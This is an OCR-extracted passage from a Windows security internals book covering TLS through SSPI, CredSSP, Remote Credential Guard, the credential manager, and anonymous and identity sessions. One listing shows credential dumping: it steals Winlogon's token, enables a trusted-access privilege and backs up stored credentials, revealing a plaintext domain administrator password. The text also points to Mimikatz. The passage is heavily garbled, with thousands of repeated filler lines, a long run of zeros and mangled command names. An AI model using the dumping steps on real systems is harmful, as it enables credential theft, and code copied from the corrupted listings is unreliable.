We can also query the server's certificate. This should match the one we used in the server's credentials. As we specified manual credential validation, we can check whether the certificate is valid; if we hadn't requested manual validation, the handshake process would have generated an error. Finally, we can also query the server's connection information to doublecheck that it's the same as the client's.

At this point, we've set up the connection, but we have yet to transfer a single byte of user data to the server. Listing 15-9 shows how to encrypt and decrypt application data sent over the network connection.

```bash
© PS$header = New-LsaSecurityBuffer -Type StreamHeader
    -Size $client.StreamHeaderSize
  PS>$data = New-LsaSecurityBuffer -Type Data -Byte 0, 1, 2, 3
  PS$ trailer = New-LsaSecurityBuffer -Type StreamTrailer
    -Size $client.StreamTrailerSize
  PS$empty = New-LsaSecurityBuffer -Empty
  PS>$bufs = $header, $data, $trailer, $empty
```

508    Chapter 15

---

```bash
#> PS> Protect-LsaContextMessage -Context $client -Buffer $bufts -NoSignature
#> $msg = $header, $data, $ trailer | ConvertFrom-LsaSecurityBuffer
#> $msg_token = Get-LsaAuthToken -Context $client -Token $msg
#> PS> Format-LsaAuthToken $msg_token
#> SChannel Record 0
# Type   : ApplicationData
# Version : 3.3
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#               _
#
```

Listing 15-9: Encrypting and decrypting application data

Secure channel requires passing four buffers to the Protect-LSaContext


Message command . The first buffer is for the TLS record header. It needs to be of type StreamHeader and should be of a size queried from the context using the StreamHeaderSize property.

The second buffer is for the data to encrypt and must be of type Data.


There is a maximum allowed size for this buffer, which you can query using the StreamMessageSize property. The maximum size is typically 16KB, so the 4 bytes we use here should fall well within the limit. If the application data to encrypt is larger than the maximum size, you'll need to fragment the data into smaller parts.

The third buffer will contain the stream trailer, which must be of type StreamTrailer and of size StreamTrailerSize. The final buffer is an empty one. The secure channel package doesn't seem to use the buffer to store anything, but you must pass it, or the call will fail.

We can now encrypt the data by passing all four buffers to the Protect-IsaContextMessage command . One important thing to note is that you should also pass the NoSignature parameter. Any generated signature will be part of the generated protocol data, not returned separately, so there is no need for the command to automatically handle the signature.

The result of the encryption is that the header, data, and trailer buffers are populated with the data required to transmit the application data to the server. We need to concatenate the buffers together using the ConvertFrom-TsaSecurityBuffer command ❶ . In this case, we already know that the data generated is a TLS record, so we can use the authentication context commands to inspect its structure. We can see that the record type is now ApplicationData ❶ whereas in Listing 15-6 the record type was

---

Handshake. The use of ApplicationData indicates that this is an encrypted data record.

Now we need to decrypt the data on the server. To do so, we again need four buffers; however, their configuration is slightly different. For decryption, we must place the entire TLS record in the first buffer as a Data type ❸. The next three buffers can be empty; they'll be populated during decryption with the appropriate parts of the message.

We pass the buffers to the Unprotect-LsaContextMessage command, again specifying the NoSignature parameter, as the signature is part of the protocol ❹. When checking the data buffer, which was originally empty, we now find it's populated with the original unencrypted data.

I've made secure channel look easy to use, but it's much more complex than shown here. For example, you'll have to deal with out-of-band alerts, which indicate problems with the connection. I recommend that you use an existing class (such as $151stream_, which comes with .NET) to add TLS support to your application unless there's a niche feature not exposed that you need to use.

By default, the TLS protocol verifies only the server in the secure channel connection, using the X.509 certificate; however, the server can request that the client also present a valid certificate for verification purposes. To require the client to send a certificate, specify the MutualAuth request attriute when creating the server authentication context. By default, secure channel will try to find a suitable certificate for the user on the client, but you can override this search by setting an explicit certificate when generating the client's credentials.

The server can query for the client's certificate using the same

RemoteCertificate property on the server authentication context. Note

that secure channel doesn't validate the contents of the client certificate by default; doing so is up to the server application. The only thing secure channel guarantees is that the client can prove they have the corresponding private key for the certificate. If the server is part of an enterprise network, it's possible to add an identity certificate to Active Directory so that the client certificate can be mapped to a user account and a

Token object can be queried for the user's identity without any further authentication.

## CredSSP

The final security package we'll look at is CredSSP, an authentication protocol developed by Microsoft to improve the security of remote desktop connections to Windows machines. Figure 15-2 shows the original remote desktop implementation.

---

![Figure](figures/WindowsSecurityInternals_page_541_figure_000.png)

Figure 15-2: The original remote desktop implementation

In the original implementation, a client would connect to the server using a client application ❶ . The RDP server would then create a LogonUI for the user that displayed the normal Windows logon user interface and replicate this LogonUI over RDP, so the user would get the same UI on their client machine. The user could then enter their username and password into the LogonUI ❷ , which would follow the interactive authentication process outlined in Chapter 12 to verify the user's credentials ❸ and create their desktop.

This approach to implementing a remote desktop has several security problems. First, it performs no verification of the client; this allows anyone to connect, then try to guess a user's password or exploit some bug in the LogonUI to get access to the server. Second, starting up a desktop session for the user interface is quite an expensive operation; it's easy to make enough connections to a remote desktop server to exhaust the machine's resources and cause a denial-of-service condition. Finally, there is a risk of the user having their credentials phished by providing them to a malicious remote server they were tricked into connecting to.

Microsoft's solution to these problems is Network Level Authentication (NLA) . NLA is available in Windows Vista onward, and it is the default authentication mechanism used when enabling remote desktop connections. NLA avoids the previously discussed problems by integrating authentication into the Remote Desktop Protocol and verifying that the user has valid credentials before starting a desktop session. This confirms the identity of the client, prevents the expensive operation of setting up the desktop until authentication succeeds, and allows the user to avoid disclosing their credentials to the server.

The CredSSP package implements NLA. It provides TLS for networklevel encryption (based on secure channel), and a separate TS Service Security Package (TSSSP) that uses the Negotiate protocol to authenticate the user, as well as to derive a session key to encrypt the user's credentials when sending them to the server. Figure 15 - 3 shows an overview of using NLA to connect to a remote desktop server.

---

![Figure](figures/WindowsSecurityInternals_page_542_figure_000.png)

Figure 15-3: A remote desktop connection using Network Level Authentication

First, instead of immediately making a connection, the user provides their credentials to the remote desktop client . This typically consists of their username and password for the remote server.

The client then makes a connection to the remote server, using the CredSSP package to protect the network traffic with TLS . The server sets up a corresponding CredSSP authentication context to implement this communication. Next, its CredSSP context uses the TSSSP package to verify the client based on an existing network authentication protocol, such as NTLM or Kerberos . If this verification step fails, the server can close the connection before creating an expensive desktop.

You might expect the server to create the user's desktop immediately once the network authentication is complete, but there's an additional wrinkle introduced when connecting to a remote desktop. Normally, when you use a network authentication protocol such as NTLM or Kerberos, the created logon session on the server can access only local resources, as the user's credentials are stored on the client computer only. This is the double hop problem I mentioned in Chapter 13 when discussing NTLM domain network authentication.

This behavior is fine if the remote desktop user is accessing a resource locally on the server. But when using a remote desktop, users typically expect to be able to perform single sign-on to other machines on the network to continue to work from that remote desktop session. To solve the single sign-on problem, the client's CredSSP context delegates the user's credentials to the server . It encrypts these credentials using the negotiated session key from the network authentication.

Because the session key for the authentication is derived from the password, a malicious server can't use NTLM relay or forward a Kerberos ticket and then capture the credentials, as they won't be able to decrypt them. Once the LSA has a copy of the credentials, the remote user can use them to connect to other network services as if they have authenticated interactively.

While CredSSP was designed for use with remote desktop connections, you'll also find it's used for other purposes that require credential

512   Chapter 15

---

delegation. For example, in PowerShell, it's possible to use CredSSP over the WinRM protocol, used for PowerShell remoting. This allows you to create a remote PowerShell session that has the client's credentials and can connect to other systems on the network.

I won't provide an example of using CredSSP, as for the most part it looks like the TLS connection you saw when testing secure channel. Instead, let's cover a few final authentication topics I haven't yet mentioned.

## Remote Credential Guard and Restricted Admin Mode

You might notice a problem with delegating your credentials to the remote desktop server. With NLA, you can be confident that the server can verify your credentials, but if an attacker has compromised the server, they could harvest the credentials once they're decrypted during the authentication process. Perhaps an attacker is waiting for you to connect to the server with your privileged domain administrator credentials. Also, there's a chance that the server will leave your credentials lying around in the LSASS process's memory even after you've logged off the system, meaning a malicious attacker can pick them up later.

Windows provides two optional features to mitigate the risk of a compromised server. The first is Remote Credential Guard, which works with Kerberos authentication to avoid directly delegating the user's credentials. Using Remote Credential Guard, the client can generate new Kerberos tickets on demand to access resources. This allows the client to connect to other systems from a remote desktop as if they had delegated their credentials.

Importantly for security, this channel to create new tickets exists only while the client is connected to the server. If they disconnect, the server can no longer create new tickets, although any client that is already authenticated will likely stay that way. This means the machine must be actively compromised while the privileged user is authenticated to be useful.

You need to perform some setup steps in your domain to enable Remote Credential Guard. The setup is out of scope for this section, but if the feature has been enabled, you can use it with the remote desktop client by running the following command line:

```bash
__________________________________________________________________________
PS> mstsc.exe /remoteGuard
```

The second security feature is Restricted Admin mode . Its big difference from Remote Credential Guard is that when a user authenticates to a server, it creates the logon session without the user's network credentials. Instead, the session is assigned network credentials for the computer account on the server. Therefore, the logon session is primarily useful only if the user wants to perform tasks locally; they won't be able to connect to network resources as themselves unless they explicitly provide their credentials to the remote server. However, this feature ensures that there are no privileged credentials steal if the server is compromised.

Negotiate Authentication and Other Security Packages   513

---

To enable Restricted Admin mode, first add a DWORD registry key value named DisableRestrictedAdmin to HKLM\System\CurrentControlSet\ Control\0a and set it to 0. Then you can enable the mode when executing the client with the following command line:

```bash
PS> Mstsc.exe /RestrictedAdmin
```

One advantage of these two security features (above and beyond the restrictions they place on credential delegation) is that they allow the remote desktop client to use single sign-on authentication based on the current user's credentials stored in the LSA logon session. This is because neither feature requires the plaintext credentials.

## The Credential Manager

One annoyance of using a remote desktop connection is having to enter your password every time you want to connect. This seems unavoidable, as you must provide the account password to the server to allow single sign-on to function from the remote desktop server. However, the LSA supports a feature to save the account password for subsequent authentication to save you typing it in again. One place where this feature is used is when you type in your credentials; you'll see a "Remember me" checkbox in the dialog, as shown in Figure 15-4.

![Figure](figures/WindowsSecurityInternals_page_544_figure_005.png)

Figure 15-4: Entering and saving your credentials

514      Chapter 15

---

If you check the box and successfully authenticate, the dialog in which to enter the server's name should change slightly the next time you open it (Figure 15-5).

![Figure](figures/WindowsSecurityInternals_page_545_figure_001.png)

Figure 15-5: Connection dialog with saved credentials

Now you can see that the dialog gives you the option to edit or delete saved credentials for this server.

It would be easy for the client to store the user's password directly to a file on disk, but that wouldn't be very secure. Instead, it uses a service provided by the LSA known as the credential manager. The service can store domain passwords for easy reuse, although Microsoft doesn't recommend this practice. To demonstrate how credentials get stored, Listing 15-10 first uses the Get- Win32Credential PowerShell command, which calls the CredReid Win32 API, to read the credentials for the remote desktop client.

```bash
PS> Get-Win32Credential "TERMSRV/primarydc.domain.local" DomainPassword |
Format-Table UserName, Password
UserName           Password
----------          --------------------
MINERAL\Administrator
```

Listing 15-10: Getting the credentials for a remote desktop client

The credentials are stored by target name, which for domain credentials is the SPN for the service (in this case, TERMSRV/primarydc.domain.local). When looking up credentials you also need to specify the type, which in this case is DomainPassword.

Here, we've formatted the output to show only the username and password. However, you might notice a problem: the password column is empty. This is an intentional behavior of the service. If the credentials represent a domain password, the password won't be returned unless the caller is running within the LSA process.

---

This behavior is fine for its intended purpose: to use in security packages that are running inside the LSA. For example, CredSSP can check whether the user has a credential for the target remote desktop service based on its SPN and use it to read the user's password to automatically authenticate. The service stores the credentials in individual files in the user's profile, as illustrated in Listing 15-11.

```bash
PS> ls "Senv: LOCALAPPDATA\Microsoft\Credentials" -Hidden
Directory: C:\Users\alice\AppData\Local\Microsoft\Credentials
Mode      LastWriteTime        Length Name
-----          ---------       ---------  -----
-a-hs   5/17      10:15 PM    4076   806C9533269F8BC19A759566441A2ECF
-a-hs   5/17      9:49 PM    420     8BE4FA20B92163BB305BA6A4D3C1SD1F
-a-hs   5/6      6:33 PM    11396  DEF70AE75C19A98EBF81B9689CESD
-a-hs   5/17      3:56 PM    1124   E05BE15D38053475F32A37559404A
```

Listing 15-11: Viewing the user's credential files

Each file is encrypted using a per-user key through the Data Protection API (DPAPI), which I mentioned in Chapter 10. This means we should be able to decrypt our own credential files using the DPAPI through the .NET ProtectedData class. Listing 15-12 enumerates the current user's credential files and tries to decrypt each one using ProtectedData.

```bash
PS> Add-Type -AssemblyName "System.Security"
  $1 = '$env:LOCALAPPDATA\Microsoft\Credentials' -h | ForEach-Object {
    $ba = Get-Content -Path $_.FullName -Encoding Byte
    [Security.Cryptography.ProtectedData]:Unprotect($ba,$null,"CurrentUser")
}$
Exception calling "Unprotect" with "3" argument(s): "The data is invalid."
--snlp--
```

Listing 15-12: Attempting to decrypt the user's credential files

Unfortunately, every file returns the same error: The data is invalid. While it is encrypted using the user's DPAPI key, the LSA sets a special flag in the binary data that indicates that only code running in the LSA can decrypt it.

There are many ways to decrypt the files successfully: for example, you could inject code into the LSA process and decrypt them from there, or you could derive the DPAPI key using the user's password and the values from the SECURITY database registry key and decrypt them yourself. If you want to go down the latter route, I'd suggest checking out existing tooling such as Mimikatz, which already implements this functionality.

Another approach to decrypting the files was introduced in Windows Vista. A special token privilege, SetTrustedCredManAccessPrivilege, allows a process to be considered trusted by the LSA when accessing select credential manager APIs. The most interesting of these select APIs is CredBackup Credentials, which will back up all of a user's credentials into a file that can later be used to restore the credentials if needed. The backup also contains any protected password values.

516    Chapter 15

---

Listing 15-13 shows how to back up a user's credentials from the credential manager. You must run these commands as an administrator, as you need to access a privileged process to get a token with $re$trustedCredManAccess Privilege, which is only granted to select process types.

```bash
# PS> Enable-NTokenPrivilege SeDebugPrivilege
# PS> $token = Use-NTObject($ps = Get-NTProcess -Name "winlogon.exe" -
-Access QueryLimitedInformation) {
    $p = $ps | Select-Object -First 1
    Get-NToken -Process $p -Duplicate
# PS> $user_token = Get-NtToken
PS> $ba = Invoke-NToken -Token $token {
   # Enable-NTokenPrivilege $efrustedCredmanAccessPrivilege
    Backup-Win32Credential -Token $user_token
# PS> Select-BinaryString -Byte $ba -Type Unicode |
Select-String "Domain:" -Context 0, 2
> Domain:target=TERMSRV/primarydc.mineral.local
MINERALAdministrator
PassWord0
```

Listing 15-13: Backing up a user's credentials from the credential manager

We first open the privileged Winlogon process and take a copy of its primary token ❶ . Next, we get a copy of the user token we want to back up, which in this case is the current process token ❷ . We can then impersonate the token we duplicated from Winlogon ❸ , enable SetTrustedCredManAccess

Privilege , and call the Backup-Min32CredentialPowerShell command, which calls the underlying CredBackupCredentials API.

The command returns a byte array containing the backup. The byte array is in a proprietary format, so we select all its Unicode strings and look for any that start with the string 000001:❸ We can see the stored remote desktop service credentials, including the name and password.

The credential manager is a better place than a user-accessible file to store credentials for use by LSA security packages such as NTLM, Kerberos, and CredSSP. However, that doesn't mean you should use it. While disclosing the credentials takes some work, like any protection mechanism, it must at some point provide the unencrypted values, which an attacker can then extract.

## Additional Request Attribute Flags

When you create a client or server authentication context, you can specify a set of request attribute flags to change the behavior of the authentication. We've already seen support for signing and sealing, as well as delegation and mutual authentication, in the previous chapters. Still, it's worth highlighting a few other flags that Kerberos and NTLM support.

---

## Anonymous Sessions

What if you don't know a user account on the target server? SSPI supports the concept of an anonymous session, also referred to as a NULL session. In an anonymous session, the authenticating user doesn't need any credentials to generate the authentication tokens. The server will process the authentication as usual, but it will generate a token for the ANONYMOUS LOGON user. This allows a network protocol to always require authentication, simplifying the protocol, and to then enforce access based on the identity of the authenticated user. You can specify an anonymous session by using the NullSession request attribute flag when creating the client authentication context, as in Listing 15-14.

```bash
PS> $client = New-LsaClientContext -CredHandle $credout
-RepeatAttribute NullSession
```

Listing 15-14: Adding the NullSession request attribute flag

If you then perform local NTLM network authentication, you should notice a change in the NTLM AUTHENTICATE token, shown in Listing 15-15.

```bash
<NTLM AUTHENTICATE>
  ❼ Flags        : Unicode, RequestTarget, NTLM, Anonymous,...
  ❼ Workstation: GRAPHITE
  ❼ LM Response: OO
  ❼ NT Response:
  ❼ Version    : 10.0.18362.15
  ❼ MIC       : 3780F9F6C815D34BA8A643162DC5FC
  ❼ PS> Format=NTToken -Token $token
  ❼ NT AUTHORITYANONYMOUS LOGON
```

Listing 15-15: The NTLM AUTHENTICATE token in an anonymous session

The NTLM AUTHENZOTE token has the Anonymous flag set ❶. Also, the LM response is a single zero byte, and the NT response is missing ❷. Querying the process's Token object shows that it's the anonymous user's ❸.

In Kerberos, the anonymous authentication token looks like that for NTLM, as shown in Listing 15-16.

```bash
<KhberosV5 KRB_AP_REQ>
  Options       : None
<Ticket>
  Ticket Version  : 0
ServerName     : UNKNOWN -
Realm
Encryption Type : NULL
Key Version    : 0
Cipher Text    :
00000000: 00
<Authenticator>
  Encryption Type : NULL
```

518    Chapter 15

---

```bash
Key Version    : 0
Cipher Text    :
00000000: 00
```

Listing 15-16: Sending an anonymous Kerberos AP-REQ message

The client sends an AP-REQ message with a ticket and authenticator containing empty values. If you see this message in a network capture, you can be certain the client is establishing an anonymous session.

## Identity Tokens

When you perform a network authentication, the final token object is an Impersonation-level token. If the server can pass the impersonation checks described in Chapter 4, it can now access that user's resources. What if we don't want the server to be able to use our identity to access resources? In this case, we can specify the Identify request attribute flag, as shown in Listing 15-17, to allow the server to receive only an Identification-level impersonation token, rather than a full Impersonation-level token.

```bash
PS> $client = New-IsaClientContext -CredHandle $credout
-RequestAttribute Identify
```

Listing 15-17: Adding the Identify request attribute flag

This will prevent the server from using our identity to access resources, but still allow it to check who has authenticated. If we then rerun the authentication, we should notice a change in the NTLM AUTHENTICATE token, as shown in Listing 15-18.

```bash
<NTLM AUTHENTICATE>
Flags      : Unicode, RequestTarget, NTLM, Identity,...
--snip--
PS> Format-NTToken -Token $token -Information
TOKEN INFORMATION
---------------
Type       : Impersonation
Imp level  : Identification
```

Listing 15-18: Examining the flags in the NTLM AUTHENTICATE token and displaying the created token's impersonation level

The NTLM AUTHENTICATE token's flags now include an Identity flag 1 . This indicates to the server that the client wants to allow the use of an Identification-level token only. When we get the token from the server authentication context and format it, we can see that the impersonation level is indeed set to Identification 2 .

As with NullSession, the Identity request attribute flag will work with Kerberos as well. Listing 15-19 shows that specifying this flag results in an Identity flag being set in the AP-REQ authenticator's GSSAPI Checksum field.

Negotiate Authentication and Other Security Packages   519

---

```bash
<Authenticator>
--snip--
Checksum       : GSSAPI
Channel Binding : 000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000